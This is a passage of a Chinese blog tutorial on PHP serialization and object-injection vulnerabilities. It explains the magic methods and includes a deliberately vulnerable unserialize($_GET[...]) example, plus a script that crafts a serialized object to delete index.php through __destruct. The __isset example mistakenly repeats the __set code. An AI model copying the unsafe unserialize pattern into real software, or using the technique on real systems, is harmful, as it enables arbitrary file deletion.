class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__construct&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">//Destructor</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__destruct&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">//call</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;__toString&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//创建一个对象</span><br><span class="hljs-comment">//__construct会被调用</span><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestClass</span>();<br><span class="hljs-comment">//创建一个方法</span><br><span class="hljs-comment">//‘This is a string’将会被输出</span><br><span class="hljs-variable">$object</span>-&gt;<span class="hljs-title function_ invoke__">PrintVariable</span>();<br><span class="hljs-comment">//对象被当作一个字符串</span><br><span class="hljs-comment">//toString会被调用</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$object</span>;<br><span class="hljs-comment">//php脚本要结束时，__destruct会被调用</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//test1.php</span><br></code></pre></td></tr></table></figure><p>再来看一下这次：</p><p><img src="https://img-blog.csdnimg.cn/20190323122026327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc1MTQ1Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p><p>从结果看，这几个magic函数依次被调用了，这个旨在帮助我们理解php的magic函数。</p><h2 id="php序列化及格式"><a href="#php序列化及格式" class="headerlink" title="php序列化及格式"></a>php序列化及格式</h2><p>在传递变量的过程中，有可能遇到变量值要跨脚本文件传递的过程。如果一个脚本中想要的调用之前一个脚本的变量，但是之前一个脚本已经执行完毕，所有的变量和内容释放掉了，那该如何操作呢？serialize和unserialize就是解决这一问题的存在，serialize可以将变量转换为字符串，并且在转换的过程中可以保存当前变量的值，而unserialize则可以将serialize生成的字符串转换回变量。通俗来说：通过反序列化在特定条件下可以重建php对象并执行php对象中某些magic函数。我们通过例子来看php对象序列化之后的格式，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//一个类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//类的数据</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment">//输出数据</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printdata</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;User &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-string">&#x27; is &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;age.<span class="hljs-string">&#x27; years old.&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//创建一个对象</span><br><span class="hljs-variable">$usr</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-comment">//设置数据</span><br><span class="hljs-variable">$usr</span>-&gt;age = <span class="hljs-number">18</span>;<br><span class="hljs-variable">$usr</span>-&gt;name = <span class="hljs-string">&#x27;vergilben&#x27;</span>;<br><span class="hljs-comment">//输出数据</span><br><span class="hljs-variable">$usr</span>-&gt;<span class="hljs-title function_ invoke__">printdata</span>();<br><span class="hljs-comment">//输出序列化后的数据</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$usr</span>)<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//test2.php</span><br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://img-blog.csdnimg.cn/20190323122119344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc1MTQ1Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p><p>下面的O:4:“User”:2:{s:3:“age”;i:18;s:4:“name”;s:9:“vergilben”;}就是对象user序列化后的形式，“O”表示对象，“4”表示对象名长度为4，“User”为对象名，“2”表示有2个参数。“{}”里面是参数的key和value，“s”表示string对象，“3”表示长度，“age”则为key；“i”是interger对象，“18”是value，后面的都是相同的道理。接下来我们进行反序列化试一试，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//一个类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//类的数据</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment">//输出数据</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printdata</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;User &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-string">&#x27; is &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;age.<span class="hljs-string">&#x27; years old.&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//重建对象</span><br><span class="hljs-variable">$usr</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;i:18;s:4:&quot;name&quot;;s:9:&quot;vergilben&quot;;&#125;&#x27;</span>);<br><span class="hljs-comment">//输出数据</span><br><span class="hljs-variable">$usr</span>-&gt;<span class="hljs-title function_ invoke__">printdata</span>();<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//test3.php</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190323122157654.png" alt="在这里插入图片描述"> </p><p>可以看到，上次序列化的结果被转变成正常的语句了。</p><h2 id="php对象注入的成因"><a href="#php对象注入的成因" class="headerlink" title="php对象注入的成因"></a>php对象注入的成因</h2><p>我们知道magic函数是php对象的特殊函数，在某些特殊情况下会被调用，这下特殊情况当然包含serialize和unserialize。<br><code>__sleep magic</code>方法在一个对象被序列化时调用，<code>__wakeup magic</code>方法在一个对象被反序列化时调用。下面解释一下： </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$variable</span> = <span class="hljs-string">&#x27;BUZZ&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$variable2</span> = <span class="hljs-string">&#x27;OTHER&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printvariable</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;variable.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__construct&#x27;</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__destruct&#x27;</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__wakeup&#x27;</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__sleep&#x27;</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;variable&#x27;</span>,<span class="hljs-string">&#x27;variable2&#x27;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//创建一个对象，回调用__construct</span><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-comment">//序列化一个对象，会调用__sleep</span><br><span class="hljs-variable">$serialized</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$object</span>);<br><span class="hljs-comment">//输出序列化后的字符串</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Serialized:&#x27;</span>.<span class="hljs-variable">$serialized</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><span class="hljs-comment">//重建对象，会调用__wakeup</span><br><span class="hljs-variable">$object2</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialized</span>);<br><span class="hljs-comment">//调用printvariable,会输出数据(BUZZ)</span><br><span class="hljs-variable">$object2</span>-&gt;<span class="hljs-title function_ invoke__">printvariable</span>();<br><span class="hljs-comment">//脚本结束，会调用__destruct</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//test4.php</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190323122302544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc1MTQ1Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p><p>可以看到serialize时调用了<code>__sleep</code>，unserialize时调用了<code>__wakeup</code>，在对象被销毁的时候用了<code>__destruce</code>。<br>存在漏洞的思路：一个类用于临时将日志储存进某个文件，当<code>__destruct</code>被调用时，日志文件将会被删除，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">logfile</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//log文件名</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;error.log&#x27;</span>;<br>    <span class="hljs-comment">//一些用于储存日志的代码</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logdata</span>(<span class="hljs-params"><span class="hljs-variable">$text</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;log data:&#x27;</span>.<span class="hljs-variable">$text</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename,<span class="hljs-variable">$text</span>,FILE_APPEND);<br>    &#125;<br>    <span class="hljs-comment">//destrcuctor 删除日志文件</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__destruct deletes &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;filename.<span class="hljs-string">&#x27;file.&lt;br /&gt;&#x27;</span>;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//test5.php</span><br><br><br></code></pre></td></tr></table></figure><p>调用这个类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;test5.php&#x27;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//类数据</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-comment">//输出数据</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printdata</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;User &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-string">&#x27; is&#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;age.<span class="hljs-string">&#x27; years old.&lt;br /&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//重建数据</span><br><span class="hljs-variable">$usr</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;usr_serialized&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//一个示例代码</span><br></code></pre></td></tr></table></figure><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220321204701634.png" alt="image-20220321204701634"> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;test5.php&#x27;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">logfile</span>();<br><span class="hljs-variable">$object</span>-&gt;filename = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$object</span>).<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//test7.php</span><br></code></pre></td></tr></table></figure><p>接下来先进入index.php：</p><p><img src="https://img-blog.csdnimg.cn/20190323122443650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc1MTQ1Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p><p>接下来尝试使用test7.php删除了index.php，进入test7.php:</p><p><img src="https://img-blog.csdnimg.cn/20190323122529281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc1MTQ1Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p><p>现在在目录里已经没有了index.php:</p><p><img src="https://img-blog.csdnimg.cn/20190323122544513.png" alt="在这里插入图片描述"> </p><p>我们再次访问一下test7.php试一试：</p><p><img src="https://img-blog.csdnimg.cn/20190323122559206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjc1MTQ1Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p><p>index.php已经没有了。<br>这是一个简单的示例。</p><h2 id="常见的注入点"><a href="#常见的注入点" class="headerlink" title="常见的注入点"></a>常见的注入点</h2><p>上一部分展示了由于输入可控造成的<code>__destruct</code>函数删除任意文件，其实问题也可能存在于<code>__wakeup</code>、<code>__sleep</code>、<code>__toString</code>等其他magic函数，一切都取决于程序逻辑。比如，某用户类定义了一个<code>__toString</code>，为了让应用程序能够将类作为一个字符串输出（echo $object），而且其他类也可能定义了一个类允许<code>__toString</code>读取某个文件。</p><h3 id="几个常见的魔术方法"><a href="#几个常见的魔术方法" class="headerlink" title="几个常见的魔术方法"></a>几个常见的魔术方法</h3><table><thead><tr><th>方法名</th><th>作用</th></tr></thead><tbody><tr><td>__construct</td><td>构造函数，在创建对象时候初始化对象，一般用于对变量赋初值</td></tr><tr><td>__destruct</td><td>析构函数，和构造函数相反，在对象不再被使用时(将所有该对象的引用设为null)或者程序退出时自动调用</td></tr><tr><td>__toString</td><td>当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串，例如echo打印出对象就会调用此方法</td></tr><tr><td>__wakeup()</td><td>使用unserialize时触发，反序列化恢复对象之前调用该方法</td></tr><tr><td>__sleep()</td><td>使用serialize时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)</td></tr><tr><td>__destruct()</td><td>对象被销毁时触发</td></tr><tr><td>__call()</td><td>在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法</td></tr><tr><td>__callStatic()</td><td>在静态上下文中调用不可访问的方法时触发</td></tr><tr><td>__get()</td><td>读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）</td></tr><tr><td>__set()</td><td>在给不可访问属性赋值时，即在调用私有属性的时候会自动执行</td></tr><tr><td>__isset()</td><td>当对不可访问属性调用isset()或empty()时触发</td></tr><tr><td>__unset()</td><td>当对不可访问属性调用unset()时触发</td></tr><tr><td>__invoke()</td><td>当脚本尝试将对象调用为函数时触发</td></tr></tbody></table><h4 id="几种常见的调用方法"><a href="#几种常见的调用方法" class="headerlink" title="几种常见的调用方法"></a>几种常见的调用方法</h4><h5 id="call"><a href="#call" class="headerlink" title="__call"></a>__call</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unknown</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;call&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">unknown</span>();<br><br></code></pre></td></tr></table></figure><h5 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;get&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$c</span>-&gt;a;<br><br></code></pre></td></tr></table></figure><h5 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;set&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$c</span>-&gt;a=<span class="hljs-number">6</span>;<br><br></code></pre></td></tr></table></figure><h5 id="isset"><a href="#isset" class="headerlink" title="__isset"></a>__isset</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;set&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$c</span>-&gt;a=<span class="hljs-number">6</span>;<br><br></code></pre></td></tr></table></figure><p>经过测试发现empty方法是不可以的</p><h5 id="unset"><a href="#unset" class="headerlink" title="__unset"></a>__unset</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>=<span class="hljs-number">6</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;unset&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$c</span>-&gt;a);<br></code></pre></td></tr></table></figure><h5 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span 